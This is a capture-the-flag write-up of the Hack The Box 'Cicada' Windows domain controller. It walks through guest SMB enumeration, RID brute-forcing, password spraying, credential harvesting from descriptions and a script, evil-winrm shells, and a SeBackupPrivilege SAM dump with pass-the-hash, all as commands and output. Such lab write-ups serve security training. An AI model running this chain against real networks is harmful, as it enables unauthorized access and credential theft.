---
title: "Hack The Box: Cicada"
date: 2025-11-14
summary: "An Easy Windows-based machine where the target is compromised by extracting a default password from a public SMB share and pairing it with RID brute-forced usernames. Enumerating LDAP account descriptions and an internal backup script yields higher-privileged user credentials with WinRM access. Final privilege escalation is achieved by abusing SeBackupPrivilege to dump local registry hives and retrieve the Administrator NTLM hash."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/Cicada"
tags:
  - active-directory
  - credentials-in-descriptions
  - credentials-in-public-shares
  - evil-winrm
  - impacket-lookupsid
  - impacket-secretsdump
  - netexec
  - nmap
  - password-spraying
  - rid-brute-forcing
  - sam
  - sebackupprivilege
  - smbclient
---

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.8.185
Nmap scan report for 10.129.8.185
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2025-11-12 10:42:08 +04 for 104s
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-12 13:42:27Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
<SNIP>
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
<SNIP>
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
<SNIP>
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
<SNIP>
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 57184/tcp): CLEAN (Timeout)
|   Check 2 (port 6481/tcp): CLEAN (Timeout)
|   Check 3 (port 19380/udp): CLEAN (Timeout)
|   Check 4 (port 62597/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-11-12T13:43:12
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
<SNIP>
```

The pattern of ports indicate that the target is a Domain Controller (DC).

### Enumerating SMB Shares

I used `netexec` to check if guest access to SMB is allowed, and it is:

```bash
$ netexec smb 10.129.8.185 -u guest -p ''
SMB         10.129.8.185    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.185    445    CICADA-DC        [+] cicada.htb\guest:
```

LDAP access is denied using guest account:

```bash
$ netexec ldap 10.129.8.185 -u guest -p ''
LDAP        10.129.8.185    389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
LDAP        10.129.8.185    389    CICADA-DC        [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090C78, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
```

Let’s create a hosts file to add it to the `/etc/hosts` file:

```bash
$ netexec smb 10.129.8.185 -u guest -p '' --generate-hosts-file hosts
SMB         10.129.8.185    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.185    445    CICADA-DC        [+] cicada.htb\guest:

$ cat hosts | sudo tee -a /etc/hosts
10.129.8.185     CICADA-DC.cicada.htb cicada.htb CICADA-DC
```

Now let’s enumerate SMB shares with `netexec` to see if there are any interesting readable shares:

```bash
$ netexec smb cicada-dc.cicada.htb -u guest -p '' --shares
SMB         10.129.8.185    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.185    445    CICADA-DC        [+] cicada.htb\guest:
SMB         10.129.8.185    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.8.185    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.8.185    445    CICADA-DC        -----           -----------     ------
SMB         10.129.8.185    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.8.185    445    CICADA-DC        C$                              Default share
SMB         10.129.8.185    445    CICADA-DC        DEV
SMB         10.129.8.185    445    CICADA-DC        HR              READ
SMB         10.129.8.185    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.8.185    445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.129.8.185    445    CICADA-DC        SYSVOL                          Logon server share
```

The HR share is readable. Let’s connect to it using `smbclient` and search for interesting files within it:

```bash
$ smbclient -N //cicada-dc.cicada.htb/HR
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 16:29:09 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 21:31:48 2024

                4168447 blocks of size 4096. 325851 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
```

So there is a notice file. Let’s read its contents:

```bash
$ cat Notice\ from\ HR.txt

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada<REDACTED>

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Interesting. There is a default password for the domain.

However, no associated username(s) are mentioned.

### Brute Forcing Usernames

Let’s brute force usernames through querying RPC in the domain for available objects, some of which are usernames.

We can use multiple ways to do so, such as `--rid-brute` module in `netexec` or `impacket-lookupsid` from `impacket`. I’ll go with the latter and use guest credentials:

```bash
$ impacket-lookupsid cicada-dc.cicada.htb/guest@cicada.htb -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

Let’s perform some bash-fu and filter for usernames and save them into a file:

```bash
$ impacket-lookupsid cicada-dc.cicada.htb/guest@cicada.htb -no-pass | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' | tee usernames.txt

Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

### Spraying Passwords and Exploiting Michael

Now let’s perform a password spray with the identified password and hope that some employees weren’t following security best practices:

```bash
$ netexec smb cicada-dc.cicada.htb -u usernames.txt -p 'Cicada<REDACTED>' --continue-on-success
SMB         10.129.8.185    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.185    445    CICADA-DC        [-] cicada.htb\Administrator:Cicada<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.8.185    445    CICADA-DC        [-] cicada.htb\Guest:Cicada<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.8.185    445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.8.185    445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.8.185    445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.8.185    445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.8.185    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada<REDACTED>
SMB         10.129.8.185    445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.8.185    445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada<REDACTED> STATUS_LOGON_FAILURE
```

Success! The user Michael hasn’t been following security best practices.

Sadly, Michael can’t use winrm:

```bash
$ netexec winrm cicada-dc.cicada.htb -u michael.wrightson -p 'Cicada<REDACTED>'
WINRM       10.129.8.185    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.8.185    5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Cicada<REDACTED>
```

Let’s see what shares can Michael access:

```bash
$ netexec smb cicada-dc.cicada.htb -u michael.wrightson -p 'Cicada<REDACTED>' --shares
SMB         10.129.8.185    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.185    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada<REDACTED>
SMB         10.129.8.185    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.8.185    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.8.185    445    CICADA-DC        -----           -----------     ------
SMB         10.129.8.185    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.8.185    445    CICADA-DC        C$                              Default share
SMB         10.129.8.185    445    CICADA-DC        DEV
SMB         10.129.8.185    445    CICADA-DC        HR              READ
SMB         10.129.8.185    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.8.185    445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.129.8.185    445    CICADA-DC        SYSVOL          READ            Logon server share
```

Michael has read access to more shares than guest, but none of them seem too interesting.

### Exploiting David

With an authenticated user, let’s enumerate LDAP for more users and their details:

```bash
$ netexec smb cicada-dc.cicada.htb -u michael.wrightson -p 'Cicada<REDACTED>' --users
SMB         10.129.8.185    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.185    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada<REDACTED>
SMB         10.129.8.185    445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.8.185    445    CICADA-DC        Administrator                 2024-08-26 20:08:03 2       Built-in account for administering the computer/domain
SMB         10.129.8.185    445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain
SMB         10.129.8.185    445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 2       Key Distribution Center Service Account
SMB         10.129.8.185    445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2
SMB         10.129.8.185    445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 2
SMB         10.129.8.185    445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0
SMB         10.129.8.185    445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp<REDACTED>
SMB         10.129.8.185    445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1
SMB         10.129.8.185    445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

Interesting. Another user hasn’t been following security best practices, leaving his password in object description.

Unfortunately, even David can’t winrm:

```bash
$ netexec winrm cicada-dc.cicada.htb -u david.orelious -p 'aRt$Lp<REDACTED>'
WINRM       10.129.8.185    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.8.185    5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp<REDACTED>
```

### Exploiting Emily and Gaining RCE

Let’s see what shares does this user have access to:

```bash
$ netexec smb cicada-dc.cicada.htb -u david.orelious -p 'aRt$Lp<REDACTED>' --shares
SMB         10.129.8.185    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.185    445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp<REDACTED>
SMB         10.129.8.185    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.8.185    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.8.185    445    CICADA-DC        -----           -----------     ------
SMB         10.129.8.185    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.8.185    445    CICADA-DC        C$                              Default share
SMB         10.129.8.185    445    CICADA-DC        DEV             READ
SMB         10.129.8.185    445    CICADA-DC        HR              READ
SMB         10.129.8.185    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.8.185    445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.129.8.185    445    CICADA-DC        SYSVOL          READ            Logon server share
```

Nice, David can read the DEV shares. Let’s do exactly that:

```bash
$ smbclient //cicada-dc.cicada.htb/DEV -U 'david.orelious%aRt$Lp<REDACTED>'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 16:31:39 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 21:28:22 2024

                4168447 blocks of size 4096. 325799 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

A backup script. Interesting.

Let’s read it:

```bash
$ cat Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp<REDACTED>" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

More abandoned security best practices are being identified. A new set of credentials is now in our arsenal.

Also, Emily can winrm!

```bash
$ netexec winrm cicada-dc.cicada.htb -u emily.oscars -p 'Q!3@Lp<REDACTED>'
WINRM       10.129.8.185    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.8.185    5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp<REDACTED> (Pwn3d!)
```

Let’s gain a shell using `evil-winrm` as Emily, where `user.txt` will be awaiting:

```bash
$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp<REDACTED>'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls

    Directory: C:\Users\emily.oscars.CICADA\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/14/2024   6:34 AM             32 user.txt

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
ea4481<REDACTED>
```

### Abusing `SeBackupPrivilege`

By enumerating privileges that Emily has, we can identify that she has `SeBackupPrivilege` enabled:

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Users who have this privilege enabled can read or copy any file on the system, even when file permissions (ACLs) would normally prevent access.

Let’s abuse that by saving SAM and SYSTEM registry hives and extract local hashes from them, one of which is the Administrator hash.

First, let’s make a copy of SAM and SYSTEM hives:

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save HKLM\SAM SAM
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save HKLM\SYSTEM SYSTEM
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls

    Directory: C:\Users\emily.oscars.CICADA\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/14/2025  12:08 PM          49152 SAM
-a----        11/14/2025  12:08 PM       18558976 SYSTEM
-a----         3/14/2024   6:34 AM             32 user.txt
```

Next, let’s download them to the attacker machine, using the download feature provided by `evil-winrm`:

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download SAM

Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\SAM to SAM

Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download SYSTEM

Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\SYSTEM to SYSTEM

Info: Download successful!
```

Finally, let’s extract the local hashes of the system using `impacket-secretsdump`:

```bash
$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

### RCE as Administrator

Now with the Administrator’s hash in hand, let’s use `evil-winrm` to gain Administrative RCE on the DC where `root.txt` will be awaiting:

```bash
$ evil-winrm -i cicada.htb -u Administrator -H 2b87e7<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/26/2024   1:09 PM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
b77fac<REDACTED>
```
